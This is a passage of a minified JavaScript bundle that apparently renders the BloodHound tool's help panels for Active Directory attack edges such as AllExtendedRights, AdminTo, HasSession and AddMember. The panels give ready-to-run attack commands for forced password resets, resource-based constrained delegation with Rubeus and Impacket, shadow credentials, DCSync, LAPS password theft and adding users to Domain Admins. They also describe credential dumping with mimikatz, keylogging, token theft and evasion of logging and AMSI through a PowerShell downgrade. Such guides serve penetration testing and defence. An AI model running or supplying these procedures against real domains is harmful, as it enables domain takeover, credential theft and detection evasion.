,children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]})},MemberOf:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:["The ",Cr(t)," ",e," is a member of the group ",r,"."]}),h(A,{variant:"body2",children:"Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions."})]}),abuse:()=>h(A,{variant:"body2",children:"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."}),opsec:()=>h(A,{variant:"body2",children:"No opsec considerations apply to this edge."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?tag=ad-delegation",children:"https://adsecurity.org/?tag=ad-delegation"}),h("br",{}),p(S,{target:"_blank",rel:"noopener",href:"https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions ",children:["https://www.itprotoday.com/management-mobility/view-or-remove-active-directory-delegated-permissions"," "]})]})},AllExtendedRights:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the AllExtendedRights privilege to the"," ",Cr(n),r,"."]}),h(A,{variant:"body2",children:"Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions."})]}),windowsAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,haslaps:o})=>{switch(n){case"User":return p(u,{children:[p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," the ability to change the password of the user ",r,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]});case"Computer":return p(u,o?{children:[p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," the ability to obtain the RID 500 administrator password of ",r,". ",e," can do so by listing a computer object's AD properties with PowerView using Get-DomainComputer ",r,". The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on"," ",r,"."]}),h(A,{variant:"body2",children:"Alternatively, AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}:{children:[h(A,{variant:"body2",children:"AllExtendedRights on a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,". This can be abused using the lsadump::dcsync command in mimikatz."]});default:return null}},linuxAbuse:({sourceName:e,targetName:t,targetType:r,haslaps:n})=>{switch(r){case"User":return p(u,{children:[p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," the ability to change the password of the user ",t,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'})]});case"Computer":return p(u,n?{children:[h(A,{variant:"body1",children:" Retrieve LAPS Password "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," the ability to obtain the RID 500 administrator password of ",t,". ",e," can do so by listing a computer object's AD properties with PowerView using Get-DomainComputer ",t,". The value of the ms-mcs-AdmPwd property will contain password of the administrative local account on"," ",t,"."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}:{children:[h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return p(u,{children:[h(A,{variant:"body1",children:"DCSync"}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",t,"."]}),h(A,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),h(A,{variant:"body1",children:" Retrieve LAPS Passwords "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege also grants ",e," enough privileges, to retrieve LAPS passwords domain-wise."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});default:return null}},opsec:()=>h(A,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword",children:"https://www.thehacker.recipes/ad/movement/dacl/readlapspassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]})},AdminTo:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," admin rights to the computer ",r,"."]}),h(A,{variant:"body2",children:"By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution."}),h(A,{variant:"body2",children:"Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user."}),h(A,{variant:"body2",children:"Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body1",children:"Lateral movement"}),h(A,{variant:"body2",children:'There are several ways to pivot to a Windows system. If using Cobalt Strike\'s beacon, check the help info for the commands "psexec", "psexec_psh", "wmi", and "winrm". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules "exploit/windows/smb/psexec", "exploit/windows/winrm/winrm_script_exec", and "exploit/windows/local/ps_wmi_exec". With Impacket, consider the example scripts psexec/wmiexec/smbexec/atexec/dcomexec. There are other alternatives like evil-winrm and crackmapexec. Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine\'s service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab.'}),h(A,{variant:"body1",children:"Gathering credentials"}),h(A,{variant:"body2",children:"The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),h(A,{variant:"body2",children:'You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter\'s "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit\'s Invoke-ClipboardMonitor to periodically gather the contents of the user\'s clipboard.'}),h(A,{variant:"body1",children:"Token Impersonation"}),h(A,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),h(A,{variant:"body1",children:"Disabling host-based security controls"}),h(A,{variant:"body2",children:"Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"There are several forensic artifacts generated by the techniques described above. For instance, lateral movement via PsExec will generate 4697 events on the target system. If the target organization is collecting and analyzing those events, they may very easily detect lateral movement via PsExec."}),h(A,{variant:"body2",children:"Additionally, an EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when abusing administrator privileges. For more information, see the References tab."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(A,{variant:"body1",children:"Lateral movement"}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Lateral_Movement",children:"https://attack.mitre.org/wiki/Lateral_Movement"}),h(A,{variant:"body1",children:"Gathering Credentials"}),h(S,{target:"_blank",rel:"noopener",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),h(A,{variant:"body1",children:"Token Impersonation"}),h(S,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf",children:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"}),h(A,{variant:"body1",children:"Disabling host-based security controls"}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/",children:"https://blog.netspi.com/10-evil-user-tricks-for-bypassing-anti-virus/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/",children:"https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/"}),h(A,{variant:"body1",children:"Opsec Considerations"}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/",children:"https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/"})]})},HasSession:{general:({sourceName:e,targetName:t})=>p(u,{children:[p(A,{variant:"body2",children:["The user ",t," has a session on the computer ",e,"."]}),h(A,{variant:"body2",children:"When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process."}),h(A,{variant:"body2",children:"Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists."}),h(A,{variant:"body2",children:"Note: A session does not guarantee credential material is present, only possible."})]}),abuse:()=>p(u,{children:[h(A,{variant:"body1",children:"Password Theft"}),h(A,{variant:"body2",children:"When a user has a session on the computer, you may be able to obtain credentials for the user via credential dumping or token impersonation. You must be able to move laterally to the computer, have administrative access on the computer, and the user must have a non-network logon session on the computer."}),h(A,{variant:"body2",children:"Once you have established a Cobalt Strike Beacon, Empire agent, or other implant on the target, you can use mimikatz to dump credentials of the user that has a session on the computer. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system."}),h(A,{variant:"body2",children:'You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter\'s "keyscan_start" command to start keylogging a user, then "keyscan_dump" to return the captured keystrokes. Or, you may use PowerSploit\'s Invoke-ClipboardMonitor to periodically gather the contents of the user\'s clipboard.'}),h(A,{variant:"body1",children:"Token Impersonation"}),h(A,{variant:"body2",children:"You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab."}),h(A,{variant:"body2",children:"User sessions can be short lived and only represent the sessions that were present at the time of collection. A user may have ended their session by the time you move to the computer to target them. However, users tend to use the same machines, such as the workstations or servers they are assigned to use for their job duties, so it can be valuable to check multiple times if a user session has started."})]}),opsec:()=>h(A,{variant:"body2",children:"An EDR product may detect your attempt to inject into lsass and alert a SOC analyst. There are many more opsec considerations to keep in mind when stealing credentials or tokens. For more information, see the References tab."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(A,{variant:"body1",children:"Gathering Credentials"}),h(S,{target:"_blank",rel:"noopener",href:"http://blog.gentilkiwi.com/mimikatz",children:"http://blog.gentilkiwi.com/mimikatz"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?page_id=1821",children:"https://adsecurity.org/?page_id=1821"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Credential_Access",children:"https://attack.mitre.org/wiki/Credential_Access"}),h(A,{variant:"body1",children:"Token Impersonation"}),h(S,{target:"_blank",rel:"noopener",href:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf",children:"https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/wiki/Technique/T1134",children:"https://attack.mitre.org/wiki/Technique/T1134"})]})},AddMember:{general:({sourceName:e,sourceType:t,targetName:r})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the ability to add arbitrary principals, including"," ","Group"===t?"themselves":"itself",", to the group ",r,". Because of security group delegation, the members of a security group have the same privileges as that group."]}),p(A,{variant:"body2",children:["By adding itself to the group, ",e," will gain the same privileges that ",r," already has."]})]}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" dfm.a /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),h(A,{variant:"body2",children:"To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as"," ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Executing this abuse with the net binary will require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),h(A,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4728 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for groups that are obviously very high privilege groups (i.e.: Domain Admins). Also be mindful that Powershell 5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity."}),h(A,{variant:"body2",children:"You may be able to completely evade those features by downgrading to PowerShell 